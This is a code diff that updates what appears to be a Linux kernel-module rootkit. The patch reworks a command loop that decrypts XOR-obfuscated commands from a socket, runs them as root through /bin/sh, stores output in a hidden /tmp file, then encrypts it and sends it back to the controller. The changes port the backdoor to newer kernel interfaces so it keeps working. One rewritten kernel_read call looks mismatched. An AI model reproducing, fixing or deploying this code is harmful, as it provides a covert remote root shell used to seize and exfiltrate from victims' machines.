@@ -18,6 +18,7 @@
 #include <linux/cred.h>
 #include <linux/namei.h>
 #include <linux/inet.h>
+#include <linux/kmod.h>
 #include <net/sock.h>
 
 MODULE_LICENSE("GPL");
@@ -42,7 +43,8 @@ static struct task_struct *g_thread = NULL;
 
 static void xor_cipher(char *data, size_t len) {
     size_t key_len = strlen(config.xor_key);
-    for (size_t i = 0; i < len; i++)
+    size_t i;
+    for (i = 0; i < len; i++)
         data[i] ^= config.xor_key[i % key_len];
 }
 
@@ -73,21 +75,28 @@ static int command_loop(void *data) {
         xor_cipher(buf, ret);
         if (strncmp(buf, "exec:", 5) == 0) {
             struct file *fp;
-            mm_segment_t old_fs;
+            loff_t pos = 0;
+            struct subprocess_info *info;
             char *cmd = buf + 5;
+            char tmp_cmd[256];
             char output[2048] = {0};
-            snprintf(output, sizeof(output), "/bin/sh -c '%s' > /tmp/.rk_tmp 2>&1", cmd);
-            call_usermodehelper_setup("/bin/sh", (char *[]) {"sh", "-c", output, NULL}, NULL, GFP_KERNEL);
-            old_fs = get_fs();
-            set_fs(KERNEL_DS);
+            char *argv[] = { "/bin/sh", "-c", cmd, NULL };
+            char *envp[] = { "HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
+
+            snprintf(tmp_cmd, sizeof(tmp_cmd), "%s > /tmp/.rk_tmp 2>&1", cmd);
+            argv[2] = tmp_cmd;
+
+            info = call_usermodehelper_setup(argv[0], argv, envp, GFP_KERNEL);
+            if (info)
+                call_usermodehelper_exec(info, UMH_WAIT_PROC);
+
             fp = filp_open("/tmp/.rk_tmp", O_RDONLY, 0);
             if (!IS_ERR(fp)) {
-                ret = kernel_read(fp, output, sizeof(output) - 1, &fp->f_pos);
+                ret = kernel_read(fp, pos, output, sizeof(output) - 1);
                 filp_close(fp, NULL);
                 xor_cipher(output, ret);
                 send_data(output, ret);
             }
-            set_fs(old_fs);
         }
     }
 
